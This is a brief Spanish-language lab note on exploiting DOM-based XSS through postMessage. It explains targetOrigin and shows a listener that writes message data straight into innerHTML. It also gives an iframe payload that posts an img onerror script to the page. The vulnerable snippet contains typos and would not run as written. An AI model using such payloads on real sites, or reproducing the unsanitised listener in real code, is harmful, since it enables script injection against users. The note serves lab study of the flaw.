# XSS DOM usando Web Messages 

Tags: #XSS-DOM #JavaScript 

```bash 
Este lab demuestra cómo una vulnerabilidad DOM XSS puede explotarse a través del uso de web messages. La página objetivo escucha mensajes entrantes con addEventListener y luego inserta su contenido directamente en el DOM dentro de un contenedor específico, sin ningún tipo de validación.

- windows.postMessage() JavaScript: Permite la comunicación segura entre objetos windows de diferentes origenes; por ejemplo, entre una página y ventana emergente que ha abierto, o entre una página y un iframe incrustado dentro de ella
	- targetOrigin: Especifica el origen que debe tener la ventana del destinatario para recibir el evento. Para que se envíe el evento, el origen debe coincidir exactamente (incluido el esquema, el nombre del host y el puerto). Si se omite, se toma como valor predeterminado el origen que llama al método. También se puede proporcionar *, lo que significa que el mensaje se puede enviar a un receptor con cualquier origen. 


Notas:
	1. Buscar en el codigo fuente código JavaScript el envio de mensajes con postMessage
```

```javascript
// Código donde se acontece la inyección 

	<script>
		window.addEventListener('message', function(e)) {
			document.detElementById('ads').innerHTML = e.data;
		}
	</script>
```

```javascript
// Colocar la función print(0) en lugar de alert(0)

<iframe width=600px height=600px src="https://web.com/" onload='this.contentWindow.postMessage("<img src=0 onerror=alert(0)>", "*")'></iframe>
```